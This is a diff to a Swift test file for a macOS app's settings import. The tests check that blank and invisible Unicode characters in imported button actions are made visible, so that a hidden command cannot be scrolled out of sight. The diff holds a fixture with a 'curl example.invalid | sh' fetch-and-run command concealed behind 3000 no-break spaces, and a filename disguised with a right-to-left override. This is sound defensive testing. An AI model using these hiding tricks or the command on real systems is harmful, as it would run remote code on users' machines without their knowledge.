@@ -1827,10 +1827,81 @@ final class SettingsFileTextTests: XCTestCase {
 
         // A path that tries to look like another one.
         XCTAssertEqual(SettingsFileText.visible("/tmp/photo\u{202E}gpj.sh"), "/tmp/photo\\u{202E}gpj.sh")
-        XCTAssertEqual(SettingsFileText.visible("/tmp/a\n\n\n/Applications/Safe.app"), "/tmp/a\\u{A}\\u{A}\\u{A}/Applications/Safe.app")
+        XCTAssertEqual(SettingsFileText.visible("/tmp/a\n\n\n/Applications/Safe.app"), "/tmp/a\\u{A}×3/Applications/Safe.app")
         XCTAssertEqual(SettingsFileText.visible("/tmp/zero\u{200B}width\u{0}\t"), "/tmp/zero\\u{200B}width\\u{0}\\u{9}")
         XCTAssertEqual(SettingsFileText.visible("/Users/someone/Büro/ファイル 1.sh"), "/Users/someone/Büro/ファイル 1.sh", "ordinary names stay")
         XCTAssertEqual(line(button, "/tmp/a\u{2028}b", "-x\u{202E}", .script), "\(buttonName): runs the script /tmp/a\\u{2028}b (arguments: -x\\u{202E})")
+    }
+
+    /// Characters that are blank are written out too, and a run of them, however long,
+    /// is one short mark. A no-break space, an ideographic space, the Hangul fillers, the
+    /// Braille blank, the grapheme joiner and the variation selectors were shown as they
+    /// are, which is as nothing: an action whose arguments held 3000 no-break spaces
+    /// showed a harmless first argument and forty blank lines, the second argument out
+    /// of sight below them (and the arguments are split at a no-break space as well).
+    func testBlankCharactersCannotPushAnythingOutOfSight() throws {
+        let blanks: [(String, String)] = [
+            ("a\u{00A0}b", "a\\u{A0}b"),                     // no-break space
+            ("a\u{3000}b", "a\\u{3000}b"),                   // ideographic space
+            ("a\u{2003}\u{2009}b", "a\\u{2003}\\u{2009}b"),   // em space, thin space
+            ("a\u{3164}b", "a\\u{3164}b"),                   // Hangul filler
+            ("a\u{115F}\u{1160}b", "a\\u{115F}\\u{1160}b"),   // Hangul choseong and jungseong fillers
+            ("a\u{FFA0}b", "a\\u{FFA0}b"),                   // halfwidth Hangul filler
+            ("a\u{2800}b", "a\\u{2800}b"),                   // Braille pattern blank
+            ("a\u{034F}b", "a\\u{34F}b"),                    // combining grapheme joiner
+            ("a\u{FE0F}b", "a\\u{FE0F}b"),                   // variation selector
+            ("a\u{E0100}b", "a\\u{E0100}b"),                 // variation selector supplement
+            ("a\u{00AD}b", "a\\u{AD}b"),                     // soft hyphen
+            ("a\u{FFFC}b", "a\\u{FFFC}b"),                   // object replacement
+        ]
+        for (text, shown) in blanks {
+            XCTAssertEqual(SettingsFileText.visible(text), shown)
+        }
+        // Ordinary text keeps its ordinary spaces; many of them, and those at an edge, are said.
+        XCTAssertEqual(SettingsFileText.visible("--name 'My File'  --quiet"), "--name 'My File'  --quiet")
+        XCTAssertEqual(SettingsFileText.visible("a   b"), "a   b")
+        XCTAssertEqual(SettingsFileText.visible("a    b"), "a\\u{20}×4b")
+        XCTAssertEqual(SettingsFileText.visible("/tmp/script.sh "), "/tmp/script.sh\\u{20}")
+        XCTAssertEqual(SettingsFileText.visible("  /tmp/script.sh"), "\\u{20}×2/tmp/script.sh")
+        XCTAssertEqual(SettingsFileText.visible(""), "")
+        // A run is one mark with its length, whatever it is made of.
+        XCTAssertEqual(SettingsFileText.visible("a" + String(repeating: "\u{00A0}", count: 3000) + "b"), "a\\u{A0}×3000b")
+        XCTAssertEqual(SettingsFileText.visible("a" + String(repeating: " ", count: 500) + "b"), "a\\u{20}×500b")
+        XCTAssertEqual(SettingsFileText.visible("a" + String(repeating: "\n", count: 40) + "b"), "a\\u{A}×40b")
+        XCTAssertEqual(SettingsFileText.visible("a\u{00A0}\u{00A0} \u{200B}b"), "a\\u{A0}×2 \\u{200B}b", "a few kinds: each with its count")
+        let pattern = String(repeating: " \u{00A0}", count: 1500)
+        XCTAssertEqual(SettingsFileText.visible("a" + pattern + "b"), "a\\u{20}\\u{A0}×3000b", "a pattern made to be long: one mark")
+        let manyKinds = String(String.UnicodeScalarView((0xE000..<0xE400).compactMap(Unicode.Scalar.init)))
+        XCTAssertEqual(SettingsFileText.visible(manyKinds), "\\u{E000}\\u{E001}\\u{E002}\\u{E003}…×1024")
+        for length in [1, 7, 100, 10_000] {
+            let run = String(repeating: "\u{00A0}\u{3000} \u{2800}\u{200B}", count: length)
+            XCTAssertLessThan(SettingsFileText.visible("a" + run + "b").count, 60, "\(length): what stands for a run is short")
+        }
+
+        // The review's file: osascript with two scripts, 3000 no-break spaces between them.
+        let arguments = "-e 'display notification \"Synced\"'" + String(repeating: "\u{00A0}", count: 3000)
+            + "-e 'do shell script \"curl example.invalid | sh\"'"
+        XCTAssertEqual(ArgumentSplitter.split(arguments).count, 4, "the action would get both scripts")
+        let binding = #"{"id":"BBBBBBBB-0000-0000-0000-000000000001","triggerEvent":{"type":"keyboard","code":96,"modifiers":0},"#
+            + #""systemShortcutName":"openTarget","isEnabled":true,"createdAt":1,"openTarget":{"path":"/usr/bin/osascript","arguments":"#
+            + SettingsFileJSON.quoted(arguments) + #","kind":"script"}}"#
+        let contents = try Fixture.contents(#""buttonBindings":["# + binding + "]")
+        let line = SettingsFileText.launchLine(for: try XCTUnwrap(contents.launchActions.first), logitech: names)
+        XCTAssertTrue(line.hasSuffix(
+            ": runs the script /usr/bin/osascript (arguments: -e 'display notification \"Synced\"'\\u{A0}×3000-e 'do shell script \"curl example.invalid | sh\"')"
+        ), line)
+        // In the sheet both scripts stand in the first lines of the list.
+        let sheet = SettingsImportSheetViewController(content: .confirm(contents, fileName: "x.json"))
+        _ = sheet.view
+        sheet.view.layoutSubtreeIfNeeded()
+        let list = try XCTUnwrap(sheet.launchList)
+        let layout = try XCTUnwrap(list.layoutManager)
+        let container = try XCTUnwrap(list.textContainer)
+        let range = (list.string as NSString).range(of: "do shell script")
+        XCTAssertNotEqual(range.location, NSNotFound)
+        let place = layout.boundingRect(forGlyphRange: layout.glyphRange(forCharacterRange: range, actualCharacterRange: nil), in: container)
+        XCTAssertLessThan(place.maxY, 80, "within the first lines")
+        XCTAssertLessThan(list.frame.height, 100, "the whole action takes a few lines")
     }
 
     func testEveryProblemIsSaidInPlainWords() {
